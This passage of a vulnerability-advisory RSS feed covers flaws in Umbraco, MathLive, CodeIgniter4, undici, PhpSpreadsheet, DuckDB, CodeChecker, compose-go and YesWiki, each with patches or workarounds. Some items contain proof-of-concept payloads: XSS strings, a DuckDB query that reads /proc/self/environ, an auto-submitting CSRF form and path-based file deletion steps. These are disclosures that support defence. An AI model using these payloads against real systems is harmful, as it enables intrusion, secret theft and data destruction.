                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/umbraco/Umbraco-CMS/security/advisories/GHSA-hmg4-wwm5-p999'>https://github.com/umbraco/Umbraco-CMS/security/advisories/GHSA-hmg4-wwm5-p999</a></li><li>- <a target='_blank' href='https://github.com/umbraco/Umbraco-CMS/commit/559c6c9f312df1d6eb1bde82c4b81c0896da6382'>https://github.com/umbraco/Umbraco-CMS/commit/559c6c9f312df1d6eb1bde82c4b81c0896da6382</a></li><li>- <a target='_blank' href='https://github.com/umbraco/Umbraco-CMS/commit/839b6816f2ae3e5f54459a0f09dad6b17e2d1e07'>https://github.com/umbraco/Umbraco-CMS/commit/839b6816f2ae3e5f54459a0f09dad6b17e2d1e07</a></li><li>- <a target='_blank' href='https://github.com/umbraco/Umbraco-CMS'>https://github.com/umbraco/Umbraco-CMS</a></li></ul><br>
                            <b>Details:</b> <b>Umbraco Allows User Enumeration Feasible Based On Management API Timing and Response Codes </b><br>### Impact

Based on an analysis of response codes and timing of Umbraco 14+ management API responses, it&#x27;s possible to determine whether an account exists.

### Patches

Will be patched in 14.3.2 and 15.1.2.

### Workarounds

None available.


                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-qwj6-q94f-8425: 6.3 | <b>MathLive&#x27;s Lack of Escaping of HTML allows for XSS</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-qwj6-q94f-8425</link>
                    <pubDate>2025-01-21T21:17:52Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-qwj6-q94f-8425'>https://osv.dev/vulnerability/GHSA-qwj6-q94f-8425</a><br>
                            <b>Published:</b> 2025-01-21T21:17:52Z<br>
                            <b>Severity:</b> 6.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/arnog/mathlive/security/advisories/GHSA-qwj6-q94f-8425'>https://github.com/arnog/mathlive/security/advisories/GHSA-qwj6-q94f-8425</a></li><li>- <a target='_blank' href='https://github.com/arnog/mathlive/commit/abc26056fd5e29a99edfa96a0bbe855ea2a8b678'>https://github.com/arnog/mathlive/commit/abc26056fd5e29a99edfa96a0bbe855ea2a8b678</a></li><li>- <a target='_blank' href='https://github.com/arnog/mathlive'>https://github.com/arnog/mathlive</a></li></ul><br>
                            <b>Details:</b> <b>MathLive&#x27;s Lack of Escaping of HTML allows for XSS</b><br>### Summary
Despite normal text rendering as LaTeX expressions, preventing XSS, the library also provides users with commands which may modify HTML, such as the `\htmlData` command, and the lack of escaping leads to XSS.

### Details
Overall in the code, other than in the `test` folder, no functions escaping HTML can be seen.

### PoC
1. Go to https:&#x2F;&#x2F;cortexjs.io&#x2F;mathlive&#x2F;demo&#x2F;
2. Paste either `\htmlData{&amp;gt;&amp;lt;img&#x2F;onerror=alert(1)&quot;src=}{}` or `\htmlData{x=&quot; &amp;gt;&amp;lt;img&#x2F;onerror=alert(1) src&amp;gt;}{}` in the LaTeX textarea.

### Impact
MathLive users who render untrusted mathematical expressions could encounter malicious input using \htmlData that runs arbitrary JavaScript, or generate invalid HTML.

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-x5mq-jjr3-vmx6: 5.3 | <b>Missing validation of header name and value in codeigniter4&#x2F;framework</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-x5mq-jjr3-vmx6</link>
                    <pubDate>2025-01-21T21:13:40Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-x5mq-jjr3-vmx6'>https://osv.dev/vulnerability/GHSA-x5mq-jjr3-vmx6</a><br>
                            <b>Published:</b> 2025-01-21T21:13:40Z<br>
                            <b>Severity:</b> 5.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/codeigniter4/CodeIgniter4/security/advisories/GHSA-x5mq-jjr3-vmx6'>https://github.com/codeigniter4/CodeIgniter4/security/advisories/GHSA-x5mq-jjr3-vmx6</a></li><li>- <a target='_blank' href='https://github.com/codeigniter4/CodeIgniter4/commit/5f8aa24280fb09947897d6b322bf1f0e038b13b6'>https://github.com/codeigniter4/CodeIgniter4/commit/5f8aa24280fb09947897d6b322bf1f0e038b13b6</a></li><li>- <a target='_blank' href='https://datatracker.ietf.org/doc/html/rfc7230#section-3.2'>https://datatracker.ietf.org/doc/html/rfc7230#section-3.2</a></li><li>- <a target='_blank' href='https://github.com/codeigniter4/CodeIgniter4'>https://github.com/codeigniter4/CodeIgniter4</a></li></ul><br>
                            <b>Details:</b> <b>Missing validation of header name and value in codeigniter4&#x2F;framework</b><br>### Impact
Lack of proper header validation for its name and value. The potential attacker can construct deliberately malformed headers with `Header` class. This could disrupt application functionality, potentially causing errors or generating invalid HTTP requests. In some cases, these malformed requests might lead to a DoS scenario if a remote service’s web application firewall interprets them as malicious and blocks further communication with the application.

### Patches
Upgrade to v4.5.8 or later.

### Workarounds
Validate HTTP header keys and&#x2F;or values if using user-supplied values before passing them to `Header` class.

### Differences from CVE-2023-29197

1. **Affected Software**:
    * CVE-2023-29197 specifically addresses a vulnerability in the `guzzlehttp&#x2F;psr7` library.
    * The reported issue in this Security Advisory is within the **CodeIgniter4** framework and does not depend on or use the `guzzlehttp&#x2F;psr7` library.

2. **Root Cause and Implementation**:
    * The vulnerability reported arises from an issue in the **Header class** of CodeIgniter4, which is unrelated to the functionality or implementation of `guzzlehttp&#x2F;psr7`.

3. **Scope of Impact**:
    * The vulnerability described in this Security Advisory affects applications built with the **CodeIgniter4** framework, which does not use or rely on the `guzzlehttp&#x2F;psr7` library.

### References
* https:&#x2F;&#x2F;datatracker.ietf.org&#x2F;doc&#x2F;html&#x2F;rfc7230#section-3.2
* https:&#x2F;&#x2F;github.com&#x2F;advisories&#x2F;GHSA-wxmh-65f7-jcvw
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-c76h-2ccp-4975: 6.8 | <b>Use of Insufficiently Random Values in undici</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-c76h-2ccp-4975</link>
                    <pubDate>2025-01-21T21:10:47Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-c76h-2ccp-4975'>https://osv.dev/vulnerability/GHSA-c76h-2ccp-4975</a><br>
                            <b>Published:</b> 2025-01-21T21:10:47Z<br>
                            <b>Severity:</b> 6.8<br>
                            <b>Langs:</b> js<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/nodejs/undici/security/advisories/GHSA-c76h-2ccp-4975'>https://github.com/nodejs/undici/security/advisories/GHSA-c76h-2ccp-4975</a></li><li>- <a target='_blank' href='https://github.com/nodejs/undici/commit/711e20772764c29f6622ddc937c63b6eefdf07d0'>https://github.com/nodejs/undici/commit/711e20772764c29f6622ddc937c63b6eefdf07d0</a></li><li>- <a target='_blank' href='https://github.com/nodejs/undici/commit/c2d78cd19fe4f4c621424491e26ce299e65e934a'>https://github.com/nodejs/undici/commit/c2d78cd19fe4f4c621424491e26ce299e65e934a</a></li><li>- <a target='_blank' href='https://github.com/nodejs/undici/commit/c3acc6050b781b827d80c86cbbab34f14458d385'>https://github.com/nodejs/undici/commit/c3acc6050b781b827d80c86cbbab34f14458d385</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/2913312'>https://hackerone.com/reports/2913312</a></li><li>- <a target='_blank' href='https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f'>https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f</a></li><li>- <a target='_blank' href='https://github.com/nodejs/undici'>https://github.com/nodejs/undici</a></li><li>- <a target='_blank' href='https://github.com/nodejs/undici/blob/8b06b8250907d92fead664b3368f1d2aa27c1f35/lib/web/fetch/body.js#L113'>https://github.com/nodejs/undici/blob/8b06b8250907d92fead664b3368f1d2aa27c1f35/lib/web/fetch/body.js#L113</a></li></ul><br>
                            <b>Details:</b> <b>Use of Insufficiently Random Values in undici</b><br>### Impact

[Undici `fetch()` uses Math.random()](https:&#x2F;&#x2F;github.com&#x2F;nodejs&#x2F;undici&#x2F;blob&#x2F;8b06b8250907d92fead664b3368f1d2aa27c1f35&#x2F;lib&#x2F;web&#x2F;fetch&#x2F;body.js#L113) to choose the boundary for a multipart&#x2F;form-data request. It is known that the output of Math.random() can be predicted if several of its generated values are known.

If there is a mechanism in an app that sends multipart requests to an attacker-controlled website, they can use this to leak the necessary values. Therefore, An attacker can tamper with the requests going to the backend APIs if certain conditions are met.

### Patches

This is fixed in 5.28.5; 6.21.1; 7.2.3.

### Workarounds

Do not issue multipart requests to attacker controlled servers.

### References

* https:&#x2F;&#x2F;hackerone.com&#x2F;reports&#x2F;2913312
* https:&#x2F;&#x2F;blog.securityevaluators.com&#x2F;hacking-the-javascript-lottery-80cc437e3b7f

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-79xx-vf93-p7cx: 5.1 | <b>Cross-Site Scripting (XSS) vulnerability in generateNavigation() function in PhpSpreadsheet</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-79xx-vf93-p7cx</link>
                    <pubDate>2025-01-21T21:09:13Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-79xx-vf93-p7cx'>https://osv.dev/vulnerability/GHSA-79xx-vf93-p7cx</a><br>
                            <b>Published:</b> 2025-01-21T21:09:13Z<br>
                            <b>Severity:</b> 5.1<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-79xx-vf93-p7cx'>https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-79xx-vf93-p7cx</a></li><li>- <a target='_blank' href='https://github.com/PHPOffice/PhpSpreadsheet/commit/4088381ccfaf241d7d42c333de0dc8c98e338743'>https://github.com/PHPOffice/PhpSpreadsheet/commit/4088381ccfaf241d7d42c333de0dc8c98e338743</a></li><li>- <a target='_blank' href='https://github.com/PHPOffice/PhpSpreadsheet'>https://github.com/PHPOffice/PhpSpreadsheet</a></li></ul><br>
                            <b>Details:</b> <b>Cross-Site Scripting (XSS) vulnerability in generateNavigation() function in PhpSpreadsheet</b><br>### Summary
The researcher discovered zero-day vulnerability Cross-Site Scripting (XSS) vulnerability in the code which translates the XLSX file into a HTML representation and displays it in the response.

### Details
When generating the HTML from an xlsx file containing multiple sheets, a navigation menu is created. This menu includes the sheet names, which are not sanitized. As a result, an attacker can exploit this vulnerability to execute JavaScript code.

```php
        &#x2F;&#x2F; Construct HTML
        $html = &#x27;&#x27;;

        &#x2F;&#x2F; Only if there are more than 1 sheets
        if (count($sheets) &amp;gt; 1) {
            &#x2F;&#x2F; Loop all sheets
            $sheetId = 0;

            $html .= &#x27;&amp;lt;ul class=&quot;navigation&quot;&amp;gt;&#x27; . PHP_EOL;

            foreach ($sheets as $sheet) {
                $html .= &#x27;  &amp;lt;li class=&quot;sheet&#x27; . $sheetId . &#x27;&quot;&amp;gt;&amp;lt;a href=&quot;#sheet&#x27; . $sheetId . &#x27;&quot;&amp;gt;&#x27; . $sheet-&amp;gt;getTitle() . &#x27;&amp;lt;&#x2F;a&amp;gt;&amp;lt;&#x2F;li&amp;gt;&#x27; . PHP_EOL;
                ++$sheetId;
            }

            $html .= &#x27;&amp;lt;&#x2F;ul&amp;gt;&#x27; . PHP_EOL;
        }
```

### PoC
1. Create an XLSX file with multiple sheets : 
![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;e3fc027a-9525-4d7f-b107-cfa6e78d04e7)

2. Generate the HTML content 
```php
&amp;lt;?php
	require __DIR__ . &#x27;&#x2F;vendor&#x2F;autoload.php&#x27;;

	$inputFileName = &#x27;payload.xlsx&#x27;;
	$spreadsheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($inputFileName);
	$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
	$writer-&amp;gt;writeAllSheets();
	echo $writer-&amp;gt;generateHTMLAll();
?&amp;gt;
```
3. Enjoy
![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;3e3c24f4-cb5d-451d-978f-9d33234f3bd1)


### Impact

XSS can cause a variety of problems for the end user that range in severity from an annoyance to complete account compromise.
Example of impacts :

- Disclosure of the user’s session cookie, allowing an attacker to hijack the user’s session and take over the account (Only if HttpOnly cookie&#x27;s flag is set to false).
- Redirecting the user to some other page or site (like phishing websites)
- Modifying the content of the current page (add a fake login page that sends credentials to the attacker).
- Automatically download malicious files.
- Requests access to the victim geolocation &#x2F; camera.
- ...

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-w2gf-jxc9-pf2q: 7.5 | <b>sniff_csv provides filesystem access even when enable_external_access is disabled in duckdb</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-w2gf-jxc9-pf2q</link>
                    <pubDate>2025-01-21T21:07:56Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-w2gf-jxc9-pf2q'>https://osv.dev/vulnerability/GHSA-w2gf-jxc9-pf2q</a><br>
                            <b>Published:</b> 2025-01-21T21:07:56Z<br>
                            <b>Severity:</b> 7.5<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/duckdb/duckdb/security/advisories/GHSA-w2gf-jxc9-pf2q'>https://github.com/duckdb/duckdb/security/advisories/GHSA-w2gf-jxc9-pf2q</a></li><li>- <a target='_blank' href='https://github.com/duckdb/duckdb/pull/13133'>https://github.com/duckdb/duckdb/pull/13133</a></li><li>- <a target='_blank' href='https://github.com/duckdb/duckdb/commit/c9b7c98aa0e1cd7363fe8bb8543a95f38e980d8a'>https://github.com/duckdb/duckdb/commit/c9b7c98aa0e1cd7363fe8bb8543a95f38e980d8a</a></li><li>- <a target='_blank' href='https://github.com/duckdb/duckdb'>https://github.com/duckdb/duckdb</a></li><li>- <a target='_blank' href='https://github.com/pypa/advisory-database/tree/main/vulns/duckdb/PYSEC-2024-203.yaml'>https://github.com/pypa/advisory-database/tree/main/vulns/duckdb/PYSEC-2024-203.yaml</a></li></ul><br>
                            <b>Details:</b> <b>sniff_csv provides filesystem access even when enable_external_access is disabled in duckdb</b><br>### Summary
Content in filesystem is accessible for reading using `sniff_csv`, even with `enable_external_access=false`. 

### Details
During a pentest, a security researcher was able to access environment variable data and other system data by using the `sniff_csv` function, even though we set `enable_external_access` to false. 

### PoC
```SQL
SET enable_external_access=false;
SET lock_configuration=true;

SELECT Columns FROM sniff_csv(&#x27;&#x2F;proc&#x2F;self&#x2F;environ&#x27;);
```

### Impact
Provides an attacker with access to filesystem even when access is expected to be disabled and other similar functions do NOT provide access. 

For example `select * from read_csv(&#x27;&#x2F;proc&#x2F;self&#x2F;environ&#x27;)` fails with a permission error. 

There seems to be two vectors to this vulnerability: 
1. Access to files that should otherwise not be allowed. (We expect `Permission Error: Scanning CSV files is disabled through configuration` and not to provide any access to the file or even acknowledge that it exists). 
2. The content from a (non-csv?) file can be read (e.g. `&#x2F;etc&#x2F;hosts`, `proc&#x2F;self&#x2F;environ`, etc) even though that doesn&#x27;t seem to be the intent of the sniff_csv function (my understanding is it&#x27;s intending to provide information about the shape of the data, but not provide the data itself). 

### Workaround
It is possible to work around the issue by disabling the local file system using the `disabled_filesystems` setting:
```SQL
SET disabled_filesystems=&#x27;LocalFileSystem&#x27;;
SET lock_configuration=true;

SELECT Columns FROM sniff_csv(&#x27;&#x2F;proc&#x2F;self&#x2F;environ&#x27;);
```

will result in `Permission Error: File system LocalFileSystem has been disabled by configuration`.

### Fix
A fix has been merged into the `main` branch (https:&#x2F;&#x2F;github.com&#x2F;duckdb&#x2F;duckdb&#x2F;pull&#x2F;13133), and will be released with the next DuckDB release.


                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-f8c8-4pm7-w885: 8.2 | <b>Cross-Site Request Forgery in CodeChecker API</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-f8c8-4pm7-w885</link>
                    <pubDate>2025-01-21T20:25:05Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-f8c8-4pm7-w885'>https://osv.dev/vulnerability/GHSA-f8c8-4pm7-w885</a><br>
                            <b>Published:</b> 2025-01-21T20:25:05Z<br>
                            <b>Severity:</b> 8.2<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/Ericsson/codechecker/security/advisories/GHSA-f8c8-4pm7-w885'>https://github.com/Ericsson/codechecker/security/advisories/GHSA-f8c8-4pm7-w885</a></li><li>- <a target='_blank' href='https://github.com/Ericsson/codechecker'>https://github.com/Ericsson/codechecker</a></li></ul><br>
                            <b>Details:</b> <b>Cross-Site Request Forgery in CodeChecker API</b><br>### Summary
Cross-site request forgery allows an unauthenticated attacker to hijack the authentication of a logged in user, and use the web API with the same permissions.

### Details
Security attributes like HttpOnly and SameSite are missing from the session cookie, allowing its use from XHR requests and form submissions.
The CodeChecker API endpoints only require the session cookie, they do not require a CSRF token, and missing HTTP headers allow the form submission to succeed (but not XHR). This means that the attacker needs to know the ID of products to edit or delete them, but it does not need knowledge to create new products with the SQLite backend.

### PoC
With a superuser logged into CodeChecker.

```html
&amp;lt;html&amp;gt;&amp;lt;body&amp;gt;
    &amp;lt;form action=&quot;https:&#x2F;&#x2F;codechecker.example.com&#x2F;v6.58&#x2F;Products&quot; method=&quot;POST&quot; enctype=&quot;text&#x2F;plain&quot;&amp;gt;
        &amp;lt;input type=&quot;text&quot; name=&#x27;[1,&quot;getProducts&quot;,1,1,{}]&#x27; value=&#x27;&#x27;&amp;gt;
    &amp;lt;&#x2F;form&amp;gt;
    &amp;lt;script&amp;gt;document.forms[0].submit()&amp;lt;&#x2F;script&amp;gt;
&amp;lt;&#x2F;body&amp;gt;&amp;lt;&#x2F;html&amp;gt;
```
Or the same form attack on any of the applicable endpoints.

### Impact
The vulnerability allows an attacker to make requests to CodeChecker as the currently logged in user, including but not limited to adding, removing or editing products. The attacker needs to know the ID of the available products to modify or delete them. The attacker cannot directly exfiltrate data from CodeChecker, due to being limited to form-based CSRF.

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-36gq-35j3-p9r9: 5.9 | <b>Excessive Platform Resource Consumption within a Loop when unmarshalling Compose file having recursive loop</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-36gq-35j3-p9r9</link>
                    <pubDate>2025-01-21T20:24:02Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-36gq-35j3-p9r9'>https://osv.dev/vulnerability/GHSA-36gq-35j3-p9r9</a><br>
                            <b>Published:</b> 2025-01-21T20:24:02Z<br>
                            <b>Severity:</b> 5.9<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/compose-spec/compose-go/security/advisories/GHSA-36gq-35j3-p9r9'>https://github.com/compose-spec/compose-go/security/advisories/GHSA-36gq-35j3-p9r9</a></li><li>- <a target='_blank' href='https://github.com/docker/compose/issues/12235'>https://github.com/docker/compose/issues/12235</a></li><li>- <a target='_blank' href='https://github.com/compose-spec/compose-go/pull/618'>https://github.com/compose-spec/compose-go/pull/618</a></li><li>- <a target='_blank' href='https://github.com/compose-spec/compose-go/pull/703'>https://github.com/compose-spec/compose-go/pull/703</a></li><li>- <a target='_blank' href='https://github.com/docker/compose/commit/d239f0f3187a2ed5404c61f83bd5e995c81600ff#diff-33ef32bf6c23acb95f5902d7097b7a1d5128ca061167ec0716715b0b9eeaa5f6R10'>https://github.com/docker/compose/commit/d239f0f3187a2ed5404c61f83bd5e995c81600ff#diff-33ef32bf6c23acb95f5902d7097b7a1d5128ca061167ec0716715b0b9eeaa5f6R10</a></li><li>- <a target='_blank' href='https://github.com/compose-spec/compose-go'>https://github.com/compose-spec/compose-go</a></li></ul><br>
                            <b>Details:</b> <b>Excessive Platform Resource Consumption within a Loop when unmarshalling Compose file having recursive loop</b><br>### Impact
The `compose-go` library component in versions `v2.10-v2.4.0` allows an authorized user who sends malicious YAML payloads to cause the `compose-go` to consume excessive amount of Memory and CPU cycles while parsing YAML, such as used by Docker Compose from versions ` v2.27.0` to `v2.29.7` included

### Patches
compose-go `v2.24.1` fixed the issue

### Workarounds
There isn&#x27;t any known workaround.

### References
* https:&#x2F;&#x2F;github.com&#x2F;docker&#x2F;compose&#x2F;issues&#x2F;12235
* https:&#x2F;&#x2F;github.com&#x2F;compose-spec&#x2F;compose-go&#x2F;pull&#x2F;703

* https:&#x2F;&#x2F;github.com&#x2F;compose-spec&#x2F;compose-go&#x2F;pull&#x2F;618
* https:&#x2F;&#x2F;github.com&#x2F;docker&#x2F;compose&#x2F;commit&#x2F;d239f0f3187a2ed5404c61f83bd5e995c81600ff#diff-33ef32bf6c23acb95f5902d7097b7a1d5128ca061167ec0716715b0b9eeaa5f6R10

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-43c9-gw4x-pcx6: 7.1 | <b>Authenticated arbitrary file deletion in YesWiki</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-43c9-gw4x-pcx6</link>
                    <pubDate>2025-01-21T20:11:37Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-43c9-gw4x-pcx6'>https://osv.dev/vulnerability/GHSA-43c9-gw4x-pcx6</a><br>
                            <b>Published:</b> 2025-01-21T20:11:37Z<br>
                            <b>Severity:</b> 7.1<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/YesWiki/yeswiki/security/advisories/GHSA-43c9-gw4x-pcx6'>https://github.com/YesWiki/yeswiki/security/advisories/GHSA-43c9-gw4x-pcx6</a></li><li>- <a target='_blank' href='https://github.com/YesWiki/yeswiki/commit/3ddd833d22703caf9025659eb174f7765df7147c'>https://github.com/YesWiki/yeswiki/commit/3ddd833d22703caf9025659eb174f7765df7147c</a></li><li>- <a target='_blank' href='https://github.com/YesWiki/yeswiki'>https://github.com/YesWiki/yeswiki</a></li></ul><br>
                            <b>Details:</b> <b>Authenticated arbitrary file deletion in YesWiki</b><br># Authenticated arbitrary file deletion in YesWiki &amp;lt;= 4.4.5

### Summary
It is possible for any authenticated user, through the use of the filemanager to delete any file owned by the user running the FastCGI Process Manager (FPM) on the host without any limitation on the filesystem&#x27;s scope.

This Proof of Concept has been performed using the followings:
- YesWiki v4.4.5 (`doryphore-dev` branch, latest)
- Docker environnment (`docker&#x2F;docker-compose.yml`)
- Docker v27.5.0
- Default installation

### Details
The vulnerability makes use of the `filemanager` that allows a user to manage files that are attached to a resource when they have owner permission on it. This part of the code is managed in `tools&#x2F;attach&#x2F;libs&#x2F;attach.lib.php`

```php
public function doFileManager($isAction = false)
{
    $do = (isset($_GET[&#x27;do&#x27;]) &amp;&amp; $_GET[&#x27;do&#x27;]) ? $_GET[&#x27;do&#x27;] : &#x27;&#x27;;
    switch ($do) {
        case &#x27;restore&#x27;:
            $this-&amp;gt;fmRestore();
            $this-&amp;gt;fmShow(true, $isAction);
            break;
        case &#x27;erase&#x27;:
            $this-&amp;gt;fmErase();
            $this-&amp;gt;fmShow(true, $isAction);
            break;
        case &#x27;del&#x27;:
            $this-&amp;gt;fmDelete();
            $this-&amp;gt;fmShow(false, $isAction);
            break;
        case &#x27;trash&#x27;:
            $this-&amp;gt;fmShow(true, $isAction);
            break;
        case &#x27;emptytrash&#x27;:
            $this-&amp;gt;fmEmptyTrash(); &#x2F;&#x2F;pas de break car apres un emptytrash =&amp;gt; retour au gestionnaire
            &#x2F;&#x2F; no break
        default:
            $this-&amp;gt;fmShow(false, $isAction);
    }
}
```

The **[fmErase()](https:&#x2F;&#x2F;github.com&#x2F;YesWiki&#x2F;yeswiki&#x2F;blob&#x2F;doryphore-dev&#x2F;tools&#x2F;attach&#x2F;libs&#x2F;attach.lib.php#L999)** function doesn&#x27;t sanitize or verify the path that has been provided by the user in any way. Thus allowing a malicious user to specify any arbitrary file on the filesystem and having it deleted through the use of `unlink()` (as long as the user that runs the process has permission to delete it).

```php
public function fmErase()
{
    $path = $this-&amp;gt;GetUploadPath();
    $filename = $path . &#x27;&#x2F;&#x27; . ($_GET[&#x27;file&#x27;] ? $_GET[&#x27;file&#x27;] : &#x27;&#x27;);
    if (file_exists($filename)) {
        unlink($filename);
    }
}
```

In addition to this deletion accross all the filesystem through `fmErase()`, it is also possible to delete any file attached to an existing wiki page, for instance, if user A creates a page and attaches images&#x2F;documents to it, they always get uploaded to the files&#x2F; directory. If user B (malicious), knows the path of the files he can also arbitrarly delete them. (**[fmDelete()](https:&#x2F;&#x2F;github.com&#x2F;YesWiki&#x2F;yeswiki&#x2F;blob&#x2F;doryphore-dev&#x2F;tools&#x2F;attach&#x2F;libs&#x2F;attach.lib.php#L1011)** is also impacted by this case)

### PoC
#### 1. Environnement setup
&amp;gt; The following actions have been performed as a privileged user

First, let&#x27;s create one user (in addition to the WikiAdmin user):

![poc1](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;f977106e-0618-4594-a673-14840ed6cb83)

Restrict the edition of &#x27;PagePrincipale&#x27; wiki page to administrators only:

![poc2](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;c40c43dd-1b4f-48fc-b425-9d7915c626bc)

#### 2. Upload of a file on a resource not owned by our user
&amp;gt; The following actions have been performed as a privileged user

Second, let&#x27;s upload a media to this `PagePrincipale` wiki page:

![poc3](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;da1cf714-34d6-4d06-8768-f6e0984172fe)
![poc4](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;3391986d-8d65-4ed0-b614-b71e9938846e)

Then view it in the page&#x27;s filemanager:

![poc5](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;821bb42c-9cb7-4209-82ac-a5884cc57eb4)

We can confirm that our file has been uploaded to the `files&#x2F;` directory by directly looking at the `yeswiki` container:

![poc5 1](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;629c88c5-744a-4203-b017-03abded00ca5)

#### 3. Arbitrary deletion (in files&#x2F;)
&amp;gt; The following actions have been performed using an unprivileged user

Now, get the full path&#x2F;name of the media in the files directory by opening it in a new tab:

![poc6](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;43cdc5f6-5e05-4797-91d8-3bed0142d72a)

Afterwards, we need an instance of filemanager to be accessible to our user so we need to create a page that we own, here is used the agenda and the creation of a new event:

![poc7](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;1ef17353-04d0-42c8-8a80-dc9f10ca7f80)

Call the `erase` method on the PagePrincipale&#x27;s uploaded media:

![poc](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;9d05fe78-a8ec-4835-b480-297d0f8fc037)

The media is now deleted from PagePrincipale (the button is shown when the attached media doesn&#x27;t exist, it&#x27;s an intended behaviour):

![poc9](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;5d20ae80-0eaa-48c1-8411-fd1c5632f524)

It has also disappeared from the `files&#x2F;` directory:

![poc10](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;a6b3e305-ec4f-4ffb-b5df-34bfddf198b3)

This behaviour can be applied to **any** file under the `files&#x2F;` directory.

#### 4. Arbitrary deletion (in &#x2F;tmp&#x2F;)
&amp;gt; The following actions have been performed using a privileged access

Finally, using the same user as the process running the app, we create a file under the `&#x2F;tmp` directory:

![poc11](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;45befa45-1023-4aed-b55a-f49864eb2174)

&amp;gt; The following actions have been performed using an unprivileged user

We can once again call the `erase` method using a relative path:

![poc3](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;b9ee7d19-5f2c-4de3-9a8d-5049c2480d3e)

The file isn&#x27;t here anymore:

![poc13](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;1ec440b6-cc95-40b5-b061-22fc46b8ae67)

### Impact
This vulnerability allows any authenticated user to arbitrarly remove content from the Wiki resulting in partial loss of data and defacement&#x2F;deteroriation of the website. In the context of a container installation of YesWiki without any modification, the &#x27;yeswiki&#x27; files (for example .php) are not owned by the same user (root) as the one running the FPM process (www-data). However in a standard installation, www-data may also be the owner of the PHP files, allowing a malicious user to completely cut the access to the wiki by deleting all important PHP files (like index.php or core files of YesWiki).

### Suggestion of possible corrective measures

- Restrict the possible paths of `fmErase()` to the `upload_path` directory.

- Restrict the use of `fmErase()` to trashed files only.

```php
public function fmErase()
{
    $path = $this-&amp;gt;GetUploadPath();
    $filename = $this-&amp;gt;GetUploadPath() . &#x27;&#x2F;&#x27; . basename(realpath(($_GET[&#x27;file&#x27;] ? $_GET[&#x27;file&#x27;] : &#x27;&#x27;))); &#x2F;&#x2F;Sanitize file path
    if (file_exists($filename) &amp;&amp; preg_match(&#x27;&#x2F;trash\d{14}$&#x2F;&#x27;, $filename)) { &#x2F;&#x2F;Make sure that the filename ends with trash and a date
        unlink($filename);
    }
}
```

- Make sure that any request to `fmErase()` or `fmDelete()` originates from the owner of the resource to which the attachment is linked (asks a bit more than a few lines of code).


                        ]]>
                    </description>
                </item>
            
                <item>
